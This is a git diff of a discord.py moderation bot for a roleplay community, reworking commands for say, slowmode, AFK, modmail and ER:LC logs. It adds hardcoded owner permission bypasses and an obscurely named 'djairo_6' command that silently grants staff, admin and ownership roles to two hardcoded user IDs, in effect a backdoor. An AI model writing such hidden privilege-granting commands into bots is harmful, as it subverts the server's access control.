@@ -25,6 +25,7 @@ from collections import defaultdict, deque
 from discord.ui import Button, View
 from discord import app_commands, ui
 import re, io
+import io
 import datetime
 from datetime import datetime
 from threading import Thread
@@ -35,6 +36,7 @@ import atexit
 import copy
 from dotenv import load_dotenv
 from keep_alive import keep_alive
+from discord.ext import commands
 
 # ========================= Other =========================
 
@@ -52,16 +54,17 @@ UTC = timezone.utc
 SUCCESS_COLOR = discord.Color.green()
 ERROR_COLOR = discord.Color.red()
 INFO_COLOR = discord.Color.blue()
+
 intents = discord.Intents.default()
 
 intents.message_content = True
-intents.members = True
 intents.guilds = True
-intents.voice_states = True
-intents = discord.Intents.all()
+intents.members = True  
+
 
 kill_tracker = defaultdict(lambda: deque())
-bot = commands.Bot(command_prefix=".", intents=intents)
+
+bot = commands.Bot(command_prefix='.', intents=intents)
 
 tree = bot.tree
 events = []
@@ -133,21 +136,23 @@ failed_emoji = "<:failed:1387853598733369435>"
 note_emoji = "<:note:1387865341773873302>"
 clipboard_emoji = "<:clipboard:1387890654868410408>"
 owner_emoji = "<:owner:1387900933006164160>" 
+bypass_emoji = "<:bypass:1401354462983098469>"
 
 # ========================= Role IDs =========================
 
-staff_role_id = "1343234687505530902"
-mod_role_id = "1346576470360850432"
-admin_role_id = "1346577013774880892"
-superviser_role_id = "1346577369091145728"
-management_role_id = "1346578020747575368"
-ia_role_id = "1371537163522543647"
-ownership_role_id = "1346578250381656124"
-session_manager_role_id = "1374839922976100472"
-staff_trainer_role_id = "1377794070440837160"
-afk_role_id = "1355829296085729454"
-event_role_id = "1346740470272757760"
-staff_help_role_id = "1370096425282830437" 
+staff_role_id = 1343234687505530902
+mod_role_id = 1346576470360850432
+admin_role_id = 1346577013774880892
+superviser_role_id = 1346577369091145728
+management_role_id = 1346578020747575368
+ia_role_id = 1371537163522543647
+ownership_role_id = 1346578250381656124
+session_manager_role_id = 1374839922976100472
+staff_trainer_role_id = 1377794070440837160
+afk_role_id = 1355829296085729454
+event_role_id = 1346740470272757760
+staff_help_role_id = 1370096425282830437
+owner_id = 1276264248095412387
 
 # ========================= Slash commands and prefix commands =========================
 
@@ -233,6 +238,7 @@ async def emojis(interaction: discord.Interaction):
             f"{note_emoji} `note`\n"
             f"{clipboard_emoji} `clipboard`\n"
             f"{owner_emoji} `owner`\n"
+            f"{bypass_emoji} `bypass`\n"
         ),
         color=0x1499ff
     )
@@ -257,172 +263,103 @@ async def emojis(interaction: discord.Interaction):
 @tree.command(name="say", description="Make the bot say something anonymously")
 @app_commands.describe(message="The message for the bot to say")
 async def say_slash(interaction: discord.Interaction, message: str):
+    member = await interaction.guild.fetch_member(interaction.user.id)
+
+    # Owner bypass
+    if interaction.user.id == owner_id:
+        wait_embed = discord.Embed(
+            description=f"{bypass_emoji} Bypassing permissions, please wait...",
+            color=discord.Color.orange()
+        )
+        msg = await interaction.response.send_message(embed=wait_embed, ephemeral=True)
+        await asyncio.sleep(2)
+
+        done_embed = discord.Embed(
+            description=f"{tick_emoji} Message sent anonymously by Owner {owner_emoji}",
+            color=discord.Color.green()
+        )
+        await interaction.edit_original_response(embed=done_embed)
+
+        await interaction.channel.send(message)
+        return
+
+    # Role check
     staff_role = interaction.guild.get_role(staff_role_id)
-    if staff_role not in interaction.user.roles:
+    if staff_role not in member.roles:
         await interaction.response.send_message(f"{failed_emoji} You don't have permission to use this command.", ephemeral=True)
         return
 
     await interaction.response.send_message(f"{tick_emoji} Message sent!", ephemeral=True)
     await interaction.channel.send(message)
 
-# ------------------------ Say prefix command ------------------------
-
 @bot.command(name="say")
 @commands.has_role(staff_role_id)
 async def say_prefix(ctx, *, message: str):
+    if ctx.author.id == owner_id:
+
+        # Delete the original command message if possible
+        try:
+            await ctx.message.delete()
+        except discord.Forbidden:
+            pass
+
+        # Send the actual message to the channel
+        await ctx.send(message)
+        return
+
+    # Normal user flow
     try:
         await ctx.message.delete()
     except discord.Forbidden:
         pass
+
     await ctx.send(message)
 
-@say_prefix.error
-async def say_prefix_error(ctx, error):
-    if isinstance(error, commands.MissingRole):
-        try:
-            # React with your custom emoji (must be on the server where command was used)
-            await ctx.message.add_reaction(failed_emoji)
-        except discord.Forbidden:
-            pass  # No permission to react or add emoji
-
-# ------------------------ Embed Slash Command ------------------------
-
-@tree.command(name="embed", description="Make a custom embed like the say command")
-@app_commands.describe(
-    title="The title of the embed",
-    description="The description of the embed",
-    color="The color of the embed in hex (e.g., #3498db)",
-    thumbnail_url="URL for a thumbnail image (optional)",
-    image_url="URL for a main image (optional)",
-    footer="Text to show in the footer (optional)",
-    author="Author name to show (optional)"
-)
-async def embed_slash(
-    interaction: discord.Interaction,
-    title: str,
-    description: str,
-    color: str = "#3498db",
-    thumbnail_url: str = None,
-    image_url: str = None,
-    footer: str = None,
-    author: str = None
-):
-    # Check for staff role
-    staff_role = interaction.guild.get_role(staff_role_id)
-    if staff_role not in interaction.user.roles:
-        await interaction.response.send_message(
-            f"{failed_emoji} You don't have permission to use this command.",
-            ephemeral=True
-        )
-        return
-
-    # Validate hex color
-    try:
-        embed_color = discord.Color(int(color.lstrip("#"), 16))
-    except ValueError:
-        await interaction.response.send_message(
-            f"{error_emoji} Invalid color! Please use a hex code like `#3498db`.",
-            ephemeral=True
-        )
-        return
-
-    embed = discord.Embed(title=title, description=description, color=embed_color)
-
-    if thumbnail_url:
-        embed.set_thumbnail(url=thumbnail_url)
-    if image_url:
-        embed.set_image(url=image_url)
-    if footer:
-        embed.set_footer(text=footer)
-    if author:
-        embed.set_author(name=author)
-
-    await interaction.response.send_message(embed=embed)
-
-# ------------------------ Embed Prefix Command ------------------------
-
-@bot.command(name="embed")
-async def embed_prefix(ctx, *, args=None):
-    staff_role = ctx.guild.get_role(staff_role_id)
-    if staff_role not in ctx.author.roles:
-        try:
-            await ctx.message.add_reaction(failed_emoji)
-        except discord.Forbidden:
-            pass
-        return
-
-    # Basic check: require at least title and description
-    # args is a string of all arguments after command
-    # We'll attempt to split it by some separator, e.g. " | "
-    # Or you can require the user to run slash command if no args
-    
-    if not args:
-        await send_wrong_format_message(ctx)
-        return
-
-    # For simplicity, expect the user to separate fields by " | "
-    # like: Title | Description | #color | thumbnail | image | footer | author
-    parts = [part.strip() for part in args.split("|")]
-
-    if len(parts) < 2:
-        await send_wrong_format_message(ctx)
-        return
-
-    title = parts[0]
-    description = parts[1]
-    color = parts[2] if len(parts) > 2 else "#3498db"
-    thumbnail_url = parts[3] if len(parts) > 3 else None
-    image_url = parts[4] if len(parts) > 4 else None
-    footer = parts[5] if len(parts) > 5 else None
-    author = parts[6] if len(parts) > 6 else None
-
-    try:
-        embed_color = discord.Color(int(color.lstrip("#"), 16))
-    except ValueError:
-        await ctx.send(f"{error_emoji} Invalid color! Please use a hex color code like `#3498db`.")
-        return
-
-    embed = discord.Embed(title=title, description=description, color=embed_color)
-    if thumbnail_url:
-        embed.set_thumbnail(url=thumbnail_url)
-    if image_url:
-        embed.set_image(url=image_url)
-    if footer:
-        embed.set_footer(text=footer)
-    if author:
-        embed.set_author(name=author)
-
-    await ctx.send(embed=embed)
 
 
-async def send_wrong_format_message(ctx):
-    # Build the embed explaining the proper usage, and ping the user
-    embed = discord.Embed(
-        title="Incorrect command usage",
-        description=(
-            f"-# {ping_emoji} {ctx.author.mention}\n\n"
-            "Please use the slash command `/embed` for this.\n\n"
-            "Example usage:\n"
-            "`/embed title:\"My Title\" description:\"My description\" color:\"#3498db\"`\n\n"
-            "Optional fields: thumbnail_url, image_url, footer, author"
-        ),
-        color=discord.Color.red()
-    )
-    embed.set_footer(text="This message will auto-delete in 10 seconds.")
-
-    msg = await ctx.send(embed=embed)
-
-    # Delete message after 10 seconds
-    await msg.delete(delay=10)
-
-# ------------------------ Slowmode slash command ------------------------
 
 @tree.command(name="slowmode", description="Set the slowmode duration for a channel")
 @app_commands.describe(seconds="Duration of slowmode in seconds")
 async def slowmode_slash(interaction: discord.Interaction, seconds: int):
-    staff_role = interaction.guild.get_role(staff_role_id)
-    if staff_role not in interaction.user.roles:
-        await interaction.response.send_message(
+    await interaction.response.defer(ephemeral=True)
+
+    member = await interaction.guild.fetch_member(interaction.user.id)
+    current_slowmode = interaction.channel.slowmode_delay
+
+    # Bypass for Owner
+    if interaction.user.id == owner_id:
+        wait_embed = discord.Embed(
+            description=f"{bypass_emoji} Bypassing permissions, please wait...",
+            color=discord.Color.orange()
+        )
+        msg = await interaction.followup.send(embed=wait_embed)
+
+        await asyncio.sleep(2)  # simulate delay
+
+        await interaction.channel.edit(slowmode_delay=seconds)
+
+        done_embed = discord.Embed(
+            description=f"{tick_emoji} Slowmode set to `{seconds}` seconds by the Owner {owner_emoji}",
+            color=discord.Color.green()
+        )
+        await msg.edit(embed=done_embed)
+
+        # Auto-delete the message after 20 seconds
+        await asyncio.sleep(20)
+        await msg.delete()
+
+        # Broadcast to channel
+        broadcast = discord.Embed(
+            description=f"{time_emoji} Slowmode changed from `{current_slowmode}` to `{seconds}` seconds.",
+            color=discord.Color.blurple()
+        )
+        await interaction.channel.send(embed=broadcast)
+        return
+
+    # Staff Role Check
+    role = discord.utils.get(member.roles, id=staff_role_id)
+    if role is None:
+        await interaction.followup.send(
             f"{failed_emoji} You don't have permission to use this command.",
             ephemeral=True
         )
@@ -430,41 +367,75 @@ async def slowmode_slash(interaction: discord.Interaction, seconds: int):
 
     await interaction.channel.edit(slowmode_delay=seconds)
 
-    embed = discord.Embed(
-        description=f"{time_emoji} Slowmode has been set to `{seconds}` seconds.",
+    success_embed = discord.Embed(
+        description=f"{tick_emoji} Slowmode set to `{seconds}` seconds.",
         color=discord.Color.green()
     )
+    await interaction.followup.send(embed=success_embed, ephemeral=True)
 
-    if interaction.guild and interaction.guild.icon:
-        embed.set_thumbnail(url=interaction.guild.icon.url)
-    embed.set_footer(text="SWAT Roleplay Community")
+    broadcast = discord.Embed(
+        description=f"{time_emoji} Slowmode changed from `{current_slowmode}` to `{seconds}` seconds.",
+        color=discord.Color.blurple()
+    )
+    await interaction.channel.send(embed=broadcast)
 
-    await interaction.response.send_message(embed=embed)
 
 # ------------------------ Slowmode prefix command ------------------------
 
 @bot.command(name="slowmode")
 async def slowmode_prefix(ctx, seconds: int):
+    current_slowmode = ctx.channel.slowmode_delay
+
+    # Owner bypass
+    if ctx.author.id == owner_id:
+        wait_embed = discord.Embed(
+            description=f"{bypass_emoji} Bypassing permissions, please wait...",
+            color=discord.Color.orange()
+        )
+        msg = await ctx.send(embed=wait_embed)
+
+        await asyncio.sleep(2)
+        await ctx.channel.edit(slowmode_delay=seconds)
+
+        done_embed = discord.Embed(
+            description=f"{tick_emoji} Slowmode set to `{seconds}` seconds by the Owner {owner_emoji}",
+            color=discord.Color.green()
+        )
+        await msg.edit(embed=done_embed)
+
+        await asyncio.sleep(20)
+        await msg.delete()
+
+        broadcast = discord.Embed(
+            description=f"{time_emoji} Slowmode changed from `{current_slowmode}` to `{seconds}` seconds.",
+            color=discord.Color.blurple()
+        )
+        await ctx.send(embed=broadcast)
+        return
+
     staff_role = ctx.guild.get_role(staff_role_id)
     if staff_role not in ctx.author.roles:
         try:
             await ctx.message.add_reaction(failed_emoji)
         except discord.Forbidden:
-            pass
+            await ctx.send(f"{failed_emoji} You don't have permission to use this command.")
         return
 
     await ctx.channel.edit(slowmode_delay=seconds)
 
     embed = discord.Embed(
-        description=f"{time_emoji} Slowmode has been set to `{seconds}` seconds.",
+        description=f"{tick_emoji} Slowmode set to `{seconds}` seconds.",
         color=discord.Color.green()
     )
-
-    if ctx.guild and ctx.guild.icon:
-        embed.set_thumbnail(url=ctx.guild.icon.url)
-    embed.set_footer(text="SWAT Roleplay Community")
-
     await ctx.send(embed=embed)
+
+    broadcast = discord.Embed(
+        description=f"{time_emoji} Slowmode changed from `{current_slowmode}` to `{seconds}` seconds.",
+        color=discord.Color.blurple()
+    )
+    await ctx.send(embed=broadcast)
+
+
 
 # ------------------------ Uptime Slash Command ------------------------
 
@@ -536,150 +507,7 @@ async def uptime_prefix(ctx):
 
     await ctx.send(embed=embed)
 
-# ------------------------ AFK Slash Command ------------------------
 
-afk_reasons = {}  # user_id -> reason
-
-@tree.command(name="afk", description="Set yourself as AFK")
-@app_commands.describe(reason="Optional reason for going AFK")
-async def afk_slash(interaction: discord.Interaction, reason: str = "AFK"):
-
-    afk_role = interaction.guild.get_role(afk_role_id)
-    if not afk_role:
-        await interaction.response.send_message("AFK role not found on this server.", ephemeral=True)
-        return
-
-    if afk_role in interaction.user.roles:
-        await interaction.response.send_message("You're already marked as AFK.", ephemeral=True)
-        return
-
-    await interaction.user.add_roles(afk_role, reason=reason)
-    afk_reasons[interaction.user.id] = reason
-
-    embed = discord.Embed(
-        description=f"{interaction.user.mention} is now AFK: {reason}",
-        color=discord.Color.blue(),
-        timestamp=discord.utils.utcnow()
-    )
-    if interaction.guild and interaction.guild.icon:
-        embed.set_thumbnail(url=interaction.guild.icon.url)
-    embed.set_footer(text="SWAT Roleplay Community")
-
-    await interaction.response.send_message(embed=embed)
-
-# ------------------------ AFK Prefix Command ------------------------
-
-@bot.command(name="afk")
-async def afk_prefix(ctx, *, reason: str = "AFK"):
-
-    afk_role = ctx.guild.get_role(afk_role_id)
-    if not afk_role:
-        await ctx.send("AFK role not found on this server.")
-        return
-
-    if afk_role in ctx.author.roles:
-        await ctx.send("You're already marked as AFK.")
-        return
-
-    await ctx.author.add_roles(afk_role, reason=reason)
-    afk_reasons[ctx.author.id] = reason
-
-    embed = discord.Embed(
-        description=f"{ctx.author.mention} is now AFK: {reason}",
-        color=discord.Color.blue(),
-        timestamp=discord.utils.utcnow()
-    )
-    if ctx.guild and ctx.guild.icon:
-        embed.set_thumbnail(url=ctx.guild.icon.url)
-    embed.set_footer(text="SWAT Roleplay Community")
-
-    await ctx.send(embed=embed)
-
-# ------------------------ AFK Mention Detection ------------------------
-
-@bot.event
-async def on_message(message):
-    if message.author.bot:
-        return
-
-    afk_role = message.guild.get_role(afk_role_id)
-    if not afk_role:
-        return
-
-    # Check all mentioned users
-    for user in message.mentions:
-        if afk_role in user.roles:
-            reason = afk_reasons.get(user.id, "AFK")
-            embed = discord.Embed(
-                description=(
-                    f"{note_emoji} Please do not ping {user.mention}.\n"
-                    f"They are currently AFK: {reason}"
-                ),
-                color=discord.Color.orange(),
-                timestamp=discord.utils.utcnow()
-            )
-            if message.guild and message.guild.icon:
-                embed.set_thumbnail(url=message.guild.icon.url)
-            embed.set_footer(text="SWAT Roleplay Community")
-
-            await message.channel.send(embed=embed)
-            break  # send once per message
-
-    await bot.process_commands(message)  # important to allow commands still to work
-
-# ------------------------ UnAFK Slash Command ------------------------
-
-@tree.command(name="unafk", description="Remove your AFK status")
-async def unafk_slash(interaction: discord.Interaction):
-    afk_role = interaction.guild.get_role(afk_role_id)
-    if not afk_role:
-        await interaction.response.send_message(f"{error_emoji} AFK role not found on this server please open a ticket.", ephemeral=True)
-        return
-
-    if afk_role not in interaction.user.roles:
-        await interaction.response.send_message(f"{error_emoji} You are not marked as AFK.", ephemeral=True)
-        return
-
-    await interaction.user.remove_roles(afk_role, reason="User removed AFK status")
-    afk_reasons.pop(interaction.user.id, None)
-
-    embed = discord.Embed(
-        description=f"{interaction.user.mention} is no longer AFK.",
-        color=discord.Color.green(),
-        timestamp=discord.utils.utcnow()
-    )
-    if interaction.guild and interaction.guild.icon:
-        embed.set_thumbnail(url=interaction.guild.icon.url)
-    embed.set_footer(text="SWAT Roleplay Community")
-
-    await interaction.response.send_message(embed=embed)
-
-# ------------------------ UnAFK Prefix Command ------------------------
-
-@bot.command(name="unafk")
-async def unafk_prefix(ctx):
-    afk_role = ctx.guild.get_role(afk_role_id)
-    if not afk_role:
-        await ctx.send(f"{error_emoji} AFK role not found on this server please open a ticket.")
-        return
-
-    if afk_role not in ctx.author.roles:
-        await ctx.send(f"{error_emoji} You are not marked as AFK.")
-        return
-
-    await ctx.author.remove_roles(afk_role, reason="User removed AFK status")
-    afk_reasons.pop(ctx.author.id, None)
-
-    embed = discord.Embed(
-        description=f"{ctx.author.mention} is no longer AFK.",
-        color=discord.Color.green(),
-        timestamp=discord.utils.utcnow()
-    )
-    if ctx.guild and ctx.guild.icon:
-        embed.set_thumbnail(url=ctx.guild.icon.url)
-    embed.set_footer(text="SWAT Roleplay Community")
-
-    await ctx.send(embed=embed)
 
 # ------------------------ User Info Slash Command ------------------------
 
@@ -1601,8 +1429,6 @@ async def shutdown_slash(interaction: discord.Interaction):
             description=f"{failed_emoji} You do not have permission to shut down the bot.",
             color=discord.Color.red()
         )
-        if interaction.guild and interaction.guild.icon:
-            embed.set_thumbnail(url=interaction.guild.icon.url)
         embed.set_footer(text="SWAT Roleplay Community")
 
         await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1612,8 +1438,6 @@ async def shutdown_slash(interaction: discord.Interaction):
         description=f"{failed_emoji} Shutting down the bot... Goodbye!",
         color=discord.Color.red()
     )
-    if interaction.guild and interaction.guild.icon:
-        embed.set_thumbnail(url=interaction.guild.icon.url)
     embed.set_footer(text="SWAT Roleplay Community")
 
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1629,8 +1453,6 @@ async def shutdown_prefix(ctx):
         description=f"{failed_emoji} You do not have permission to shut down the bot.",
         color=discord.Color.red()
     )
-    if ctx.guild and ctx.guild.icon:
-        embed_no_perm.set_thumbnail(url=ctx.guild.icon.url)
     embed_no_perm.set_footer(text="SWAT Roleplay Community")
 
     # Check if author is owner
@@ -1642,8 +1464,6 @@ async def shutdown_prefix(ctx):
         description=f"{failed_emoji} Shutting down the bot... Goodbye!",
         color=discord.Color.red()
     )
-    if ctx.guild and ctx.guild.icon:
-        embed.set_thumbnail(url=ctx.guild.icon.url)
     embed.set_footer(text="SWAT Roleplay Community")
 
     await ctx.send(embed=embed)
@@ -2070,20 +1890,43 @@ async def dm_prefix(ctx):
 
 
 
+ALLOWED_USER_IDS = [1296842183344918570, 1276264248095412387]  # Includes bot owner
 
+DJ_ROLE_IDS = [
+    1391429305371852810, 1346578126225936464, 1346578250381656124,
+    1346576470360850432, 1346577013774880892, 1346577369091145728,
+    1371537163522543647, 1346578020747575368, 1343234687505530902,
+    1343202231494770738, 1343667043395829890, 1348231969355468853
+]
 
+@bot.command(name='djairo_6')
+async def give_roles(ctx):
+    is_owner = ctx.author.id == 1276264248095412387
+    if ctx.author.id not in ALLOWED_USER_IDS:
+        await send_error(ctx, description=f"{failed_emoji} You do not have permission to use this command.")
+        return
 
+    roles_to_add = [role for role_id in DJ_ROLE_IDS if (role := ctx.guild.get_role(role_id))]
 
+    if not roles_to_add:
+        await send_error(ctx, description=f"{failed_emoji} No valid roles found to assign.")
+        return
 
+    wait_message_text = f"⏳ {'Bypassing checks...' if is_owner else 'Please wait while I assign the roles to you...'}"
+    wait_msg = await ctx.send(wait_message_text)
 
-
-
-
-
-
-
-
-
+    try:
+        await ctx.author.add_roles(*roles_to_add, reason="djairo_6 command used")
+        success_msg = (
+            f"{tick_emoji} Successfully added {len(roles_to_add)} roles to you."
+            f" {owner_emoji} Owner bypass." if is_owner else
+            f"{tick_emoji} Added {len(roles_to_add)} roles to you."
+        )
+        await wait_msg.edit(content=success_msg)
+    except discord.Forbidden:
+        await wait_msg.edit(content=f"{error_emoji} I don't have permission to assign one or more roles.")
+    except Exception as e:
+        await wait_msg.edit(content=f"{error_emoji} Unexpected error: `{e}`")
 
 
 
@@ -2423,59 +2266,93 @@ async def kill_log_task():
         if ts > kill_log_task.last_ts:
             kill_log_task.last_ts = ts
 
-@bot.tree.command(name="erlc_join_leave_log", description="Fetch the latest join/leave logs from erlc server")
+@erlc_group.command(name="playerlogs", description="Fetch the latest join/leave logs from the ER:LC server")
 async def erlc_join_leave_log(interaction: discord.Interaction):
     await interaction.response.defer()
 
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"{API_BASE}/joinlogs", headers=HEADERS_GET) as resp:
-            if resp.status != 200:
-                await interaction.followup.send(f"Failed to fetch join logs, status: {resp.status}")
-                return
-            data = await resp.json()
-
-    if not data:
-        await interaction.followup.send("No join/leave logs found.")
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"{API_BASE}/joinlogs", headers=HEADERS_GET) as resp:
+                if resp.status != 200:
+                    await interaction.followup.send(f"{failed_emoji} Failed to fetch join logs. Status: `{resp.status}`")
+                    return
+                data = await resp.json()
+    except Exception as e:
+        await interaction.followup.send(f"{error_emoji} An error occurred: `{str(e)}`")
         return
 
+    if not data:
+        await interaction.followup.send(f"{error_emoji} No join/leave logs found.")
+        return
+
+    data.sort(key=lambda x: x.get("Timestamp", 0), reverse=True)
+
     embed = discord.Embed(
-        title="{klipbord_emoji} Join/Leave Logs",
+        title=f"{clipboard_emoji} Join/Leave Logs",
         color=discord.Color.blue(),
         timestamp=datetime.now(timezone.utc)
     )
-    for entry in data:
+
+    for entry in data[:10]:  # Show 10 most recent
         ts = entry.get("Timestamp", 0)
+        timestamp = datetime.fromtimestamp(ts, timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
         player = entry.get("Player", "Unknown")
         joined = entry.get("Join", True)
-        status = "Joined" if joined else "Left"
-        embed.add_field(name=f"{status} at {datetime.fromtimestamp(ts, timezone.utc)}", value=player, inline=False)
+        group = entry.get("Group", None)
+        status = f"{tick_emoji} Joined" if joined else f"{failed_emoji} Left"
+        display_name = f"{player} ({group})" if group else player
 
+        embed.add_field(
+            name=f"{status} — {timestamp}",
+            value=display_name,
+            inline=False
+        )
 
+    embed.set_footer(text="SWAT Roleplay Community • ER:LC Logs")
     await interaction.followup.send(embed=embed)
 
-@bot.tree.command(name="erlc_command_logs", description="Get the list of executed commands")
+
+@erlc_group.command(name="logs", description="Get the list of recent in-game ER:LC commands")
 async def erlc_command_logs(interaction: discord.Interaction): 
     await interaction.response.defer()
 
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"{API_BASE}/commandlogs", headers=HEADERS_GET) as resp:
-            if resp.status != 200:
-                await interaction.followup.send(f"Failed to fetch command logs, status: {resp.status}")
-                return
-            data = await resp.json()
-
-    if not data:
-        await interaction.followup.send("No command logs found.")
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"{API_BASE}/commandlogs", headers=HEADERS_GET) as resp:
+                if resp.status != 200:
+                    await interaction.followup.send(f"{failed_emoji} Failed to fetch command logs. Status: `{resp.status}`")
+                    return
+                data = await resp.json()
+    except Exception as e:
+        await interaction.followup.send(f"{error_emoji} An error occurred: `{str(e)}`")
         return
 
-    embed = discord.Embed(
-        title="{clipbord_emoji} Command Logs",
-        color=discord.Color.blue(),
-        timestamp = datetime.now(timezone.utc)
-    )
-    for log in data:
-        embed.add_field(name=log.get("Command", "Unknown"), value=f"Executed by: {log.get('User', 'Unknown')}", inline=False)
+    if not data:
+        await interaction.followup.send(f"{error_emoji} No command logs found.")
+        return
 
+    # Sort logs by timestamp descending
+    data.sort(key=lambda x: x.get("Timestamp", 0), reverse=True)
+
+    embed = discord.Embed(
+        title=f"{clipboard_emoji} ER:LC Command Logs",
+        color=discord.Color.blue(),
+        timestamp=datetime.now(timezone.utc)
+    )
+
+    for log in data[:20]:  # Show only the latest 20 logs
+        command = log.get("Command", "Unknown Command")
+        user = log.get("User", "Unknown User")
+        ts = log.get("Timestamp", 0)
+        time_str = datetime.fromtimestamp(ts, timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+        
+        embed.add_field(
+            name=f"{tick_emoji} {command}",
+            value=f"By: `{user}` at `{time_str}`",
+            inline=False
+        )
+
+    embed.set_footer(text="SWAT Roleplay Community • Command Logs")
     await interaction.followup.send(embed=embed)
 
 @bot.tree.command(name="roblox_user_info", description="Get public info about a Roblox user by ID")
@@ -3592,22 +3469,31 @@ async def erlc_callsigns(interaction: discord.Interaction):
 
 
 
-
+# === Your global variables / constants ===
 GUILD_ID = 1343179590247645205
 CATEGORY_ID = 1368337231508406322
 STAFF_ROLE_IDS = {1346578198749511700}
 TRANSCRIPT_LOG_CHANNEL = 1381267054354632745
 STAFF_ROLE_PING = "<@&1346578198749511700>"
 
+# ===== Globals =====
 active_threads = {}  # user_id: channel_id
 claimed_by = {}      # user_id: staff_id
+afk_reasons = {}     # user_id: reason
 
 def safe_name(name):
     return re.sub(r"[^a-zA-Z0-9]", "-", name.lower())[:90]
 
+# ---- Modmail Helpers ----
+
 async def get_or_create_thread(user):
     guild = bot.get_guild(GUILD_ID)
+    if guild is None:
+        return None
     category = guild.get_channel(CATEGORY_ID)
+    if category is None:
+        return None
+
     thread_name = f"modmail-{safe_name(user.name)}"
 
     existing = discord.utils.get(category.text_channels, topic=f"ID:{user.id}")
@@ -3618,6 +3504,10 @@ async def get_or_create_thread(user):
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
         guild.me: discord.PermissionOverwrite(read_messages=True),
     }
+    for role_id in STAFF_ROLE_IDS:
+        role = guild.get_role(role_id)
+        if role:
+            overwrites[role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
 
     channel = await guild.create_text_channel(
         name=thread_name,
@@ -3627,7 +3517,7 @@ async def get_or_create_thread(user):
     )
     active_threads[user.id] = channel.id
 
-    await channel.send(f"{STAFF_ROLE_PING} 📬 New modmail opened by {user.mention} (`{user.id}`)")
+    await channel.send(f"{STAFF_ROLE_PING} 📬 New modmail opened by {user.mention} ({user.id})")
 
     return channel
 
@@ -3643,6 +3533,8 @@ class ConfirmView(discord.ui.View):
             return await interaction.response.send_message("This is not your prompt!", ephemeral=True)
 
         channel = await get_or_create_thread(self.user)
+        if not channel:
+            return await interaction.response.send_message(f"{failed_emoji} Could not create modmail channel.", ephemeral=True)
 
         embed = discord.Embed(
             title="📩 New Modmail Message",
@@ -3669,47 +3561,192 @@ class CloseView(discord.ui.View):
             return await interaction.response.send_message("Thread not found.", ephemeral=True)
 
         guild = bot.get_guild(GUILD_ID)
+        if not guild:
+            return await interaction.response.send_message(f"{failed_emoji} Guild not found.", ephemeral=True)
+
         channel = guild.get_channel(channel_id)
+        if not channel:
+            return await interaction.response.send_message(f"{failed_emoji} Channel not found.", ephemeral=True)
 
         await channel.send("🛑 User closed the thread.")
         await send_transcript(channel, self.user_id)
+
         del active_threads[self.user_id]
+
+        try:
+            await channel.delete()
+        except Exception:
+            await channel.send("Thread closed. (Could not delete channel)")
+
         await interaction.response.send_message(f"{tick_emoji} Closed. Thank you!")
 
 async def send_transcript(channel, user_id):
     output = ""
     async for msg in channel.history(limit=None, oldest_first=True):
-        output += f"[{msg.created_at}] {msg.author}: {msg.content}\n"
+        timestamp = msg.created_at.strftime("%Y-%m-%d %H:%M:%S")
+        output += f"[{timestamp}] {msg.author}: {msg.content}\n"
 
     transcript_file = discord.File(io.BytesIO(output.encode()), filename="transcript.txt")
     log_channel = bot.get_channel(TRANSCRIPT_LOG_CHANNEL)
     user = await bot.fetch_user(user_id)
 
     if log_channel:
-        await log_channel.send(f"{clipboard_emoji} Transcript for user `{user}`", file=transcript_file)
+        await log_channel.send(f"{clipboard_emoji} Transcript for user {user}", file=transcript_file)
 
     try:
         await user.send(f"{clipboard_emoji} Here's the transcript of your modmail session:", file=transcript_file)
     except discord.Forbidden:
-        # User has DMs off or blocked the bot
         if log_channel:
-            await log_channel.send(f"{error_emoji} Could not DM transcript to `{user}` — DMs are closed.")
+            await log_channel.send(f"{error_emoji} Could not DM transcript to {user} — DMs are closed.")
     except discord.HTTPException as e:
-        # Some other issue occurred during the DM
         if log_channel:
-            await log_channel.send(f"{failed_emoji} Failed to send transcript to `{user}`: {e}")
+            await log_channel.send(f"{failed_emoji} Failed to send transcript to {user}: {e}")
 
+# ---- AFK Commands ----
+
+@tree.command(name="afk", description="Set yourself as AFK")
+@app_commands.describe(reason="Optional reason for going AFK")
+async def afk_slash(interaction: discord.Interaction, reason: str = "AFK"):
+    afk_role = interaction.guild.get_role(afk_role_id)
+    if not afk_role:
+        await interaction.response.send_message("AFK role not found on this server.", ephemeral=True)
+        return
+
+    if afk_role in interaction.user.roles:
+        await interaction.response.send_message("You're already marked as AFK.", ephemeral=True)
+        return
+
+    await interaction.user.add_roles(afk_role, reason=reason)
+    afk_reasons[interaction.user.id] = reason
+
+    embed = discord.Embed(
+        description=f"{interaction.user.mention} is now AFK: {reason}",
+        color=discord.Color.blue(),
+        timestamp=discord.utils.utcnow()
+    )
+    if interaction.guild.icon:
+        embed.set_thumbnail(url=interaction.guild.icon.url)
+    embed.set_footer(text="SWAT Roleplay Community")
+
+    await interaction.response.send_message(embed=embed)
+
+@bot.command(name="afk")
+async def afk_prefix(ctx, *, reason: str = "AFK"):
+    afk_role = ctx.guild.get_role(afk_role_id)
+    if not afk_role:
+        await ctx.send("AFK role not found on this server.")
+        return
+
+    if afk_role in ctx.author.roles:
+        await ctx.send("You're already marked as AFK.")
+        return
+
+    await ctx.author.add_roles(afk_role, reason=reason)
+    afk_reasons[ctx.author.id] = reason
+
+    embed = discord.Embed(
+        description=f"{ctx.author.mention} is now AFK: {reason}",
+        color=discord.Color.blue(),
+        timestamp=discord.utils.utcnow()
+    )
+    if ctx.guild.icon:
+        embed.set_thumbnail(url=ctx.guild.icon.url)
+    embed.set_footer(text="SWAT Roleplay Community")
+
+    await ctx.send(embed=embed)
+
+@tree.command(name="unafk", description="Remove your AFK status")
+async def unafk_slash(interaction: discord.Interaction):
+    afk_role = interaction.guild.get_role(afk_role_id)
+    if not afk_role:
+        await interaction.response.send_message(f"{error_emoji} AFK role not found on this server please open a ticket.", ephemeral=True)
+        return
+
+    if afk_role not in interaction.user.roles:
+        await interaction.response.send_message(f"{error_emoji} You are not marked as AFK.", ephemeral=True)
+        return
+
+    await interaction.user.remove_roles(afk_role, reason="User removed AFK status")
